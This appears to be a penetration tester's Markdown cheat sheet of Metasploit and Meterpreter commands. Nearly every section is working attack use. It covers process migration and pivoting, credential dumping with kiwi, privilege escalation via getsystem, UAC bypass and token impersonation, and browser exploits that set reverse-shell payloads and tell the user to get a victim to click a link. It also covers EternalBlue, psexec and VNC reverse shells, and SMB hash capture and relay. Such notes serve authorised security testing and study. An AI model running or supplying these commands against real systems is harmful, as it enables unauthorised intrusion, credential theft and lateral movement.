# Metasploit
##### Kill Job, but not Existing Meterpreter Shell
```bash
jobs -k <Job #>
```

##### Search Modules with Grep
```bash
grep <Search String> search type:<Category>

grep smb search type:exploit
```

##### Get Module Information
```bash
use <Module Name>
info
```

##### Use with Nessus
```bash
# Make sure that Postgres is running
service postgresql status
service postgresql start

load nessus
nessus_connect <Username>:<Password>@<Host>
nessus_help

# List current, Nessus scan.
nessus_scan_list

# List vulnerabilities found in a scan.
nessus_report_vulns <Scan ID>

# Import Nessus scan
nessus_db_import <Scan ID>

# List vulnerabilities from imported scan.
vulns
```

# Meterpreter
### Migrate to Another Process Automatically
```bash
# As script
run post/windows/manage/migrate

# As module
use post/windows/manage/migrate
set SESSION <Session #>
run
```
### Migrate to Another Process By Name
```bash
migrate -N <Process Name>.<Extension>
```
### Pivot With Meterpreter and Proxychains
```bash
# Establish meterpreter session
# Background meterpreter
background
use post/multi/manage/autoroute
show options
set SESSION <meterpreter session #>
set NETMASK <Netmask of NIC on exploited target>
run

cat /etc/proxychains4.conf

use auxiliary/server/socks_proxy
show options
SRVPORT = 1080
VERSION = 5
set SRVPORT 9050 # Change port to match /etc/proxychains4.conf
set VERSION 4a # Does not work with version 5.  Must be 4a.
run
jobs

# Run nmap scan
proxychains nmap -sV -sT -Pn -sC -p<Port #> <Target Host>
# Exploited target with SMB.  Therefore, -p must be 445.
```
##### [Pivoting attack traffic](https://www.youtube.com/watch?v=Wn59J8PiIl0)
##### [84 post exploitation pivoting autoroute](https://www.youtube.com/watch?v=jjUamstPDWo)
##### [Multi Manage Network Route via Meterpreter Session - Metasploit](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/autoroute)
### Dump Clear Text Credentials and Hashes
```bash
sessions -i <Session #>
load kiwi
help
creds_all
```
### Escalate Privileges
#### Linux PrivEsc
#### Windows PrivEsc
##### Escalate Privileges with GetSystem
```bash
# Only works with Windows
getsystem

# 0: All techniques available
# 1: Named Pipe Impersonation (In Memory/Admin)
# 2: Named Pipe Impersonation (Dropper/Admin)
# 3: Token Duplication (In Memory/Admin)
# 4: Named Pipe Impersonation (RPCSS variant)
```
##### Windows Gather Privileges Enumeration
```bash
use post/windows/gather/win_privs
set SESSION <Session #>
run
```
##### Escalate Privileges Under UAC
```bash
# Determine if UAC is enabled, if so, getsystem will fail
use post/windows/gather/win_privs
set SESSION <Session #>
run

# If UAC is enabled
search bypassuac
use
set SESSION <Session #>
exploit

getsystem
```
##### Escalate with Incognito
```bash
# From Meterpreter shell
use incognito
list_tokens -u
impersonate_token <Token Name> # Escape \'s.
```
##### Exploit Unquoted Service Paths
```bash
use exploit/windows/local/unquoted_service_path
set SESSION <Session #>
exploit
```

# Client-Side Exploits
### Exploit Client with Adobe Flash
##### UAF
```bash
msfconsole -q
user exploit/multi/browser/adobe_flash_hacking_team_uaf
show options
set LHOST <Attack Machine>

show targets
set TARGET <Target #>

show payloads
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_tcp

exploit

# Get victim to click the link that is generated by Metasploit.
```

### Exploit Client with Firefox
##### PDFJS
```bash
msfconsole -q
user exploit/multi/browser/firefox_pdfjs_privilege_escalation
show options

show targets

show payloads
set PAYLOAD payload/firefox/shell_reverse_tcp
exploit

# Get victim to click the link that is generated by Metasploit.
```

# Remote Exploits
##### EternalBlue
```bash
msfconsole -q

# Scan target to determine if it is vulnerable to EternalBlue.
use auxiliary/scanner/smb/smb_ms17_010 
show options
set RHOSTS <Target Host>
# Set SMBDomain, SMBUser, SMBPass settings, if available.
run

use windows/smb/ms17_010_eternalblue
show options
set RHOSTS <Target Host>
# Set SMBDomain, SMBUser, SMBPass settings, if available.
exploit
```

# Services
### Finger
##### Enumerate Users with Finger
```bash
msfconsole -q
search finger
use auxiliary/scanner/finger/finger_users
use 1
show options

set RHOSTS <SMTP Host>
set USERS_FILE <Wordlist>
run
```

### SMB
##### Establish Reverse Shell with SMB
```bash
msfconsole
use exploit/windows/smb/psexec
set RHOSTS <Target Host>
set SMBUser <Username>
set SMBPass <Password>
exploit
```

##### Capture SMB Hashes
```bash
msfconsole
use auxiliary/server/capture/smb
show options

# Do not change the challenge, as there are rainbow tables built for this challenge.
set JOHNWPFILE hashes
run
```

##### SMB Relay
```bash
msfconsole
use exploit/windows/smb/smb_relay
show options

set SMBHOST <Target Host>
```

### SMTP
##### Enumerate SMTP Users
```bash
msfconsole -q
search smtp_enum

use auxiliary/scanner/smtp/smtp_enum
# or
use 0
show options

set RHOSTS <SMTP Host>
set USER_FILE <Wordlist>
run
```

### VNC
##### Reverse Shell with VNC
```bash
msfconsole -q
use exploit/multi/vnc/vnc_keyboard_exec
show options

set RHOSTS <Target Host>
set PASSWORD <Password>

show targets
set TARGET <Target #>

show payloads
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_tcp
```

# Nmap Scan with Metasploit

This will perform a nmap scan and feed the results into Metasploit.
```bash
msfconsole
db_nmap
```

# Cheatsheets
[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

# References
[Deep Dive Into Stageless Meterpreter Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)

[Metasploit Module Library](https://www.infosecmatter.com/metasploit-module-library/)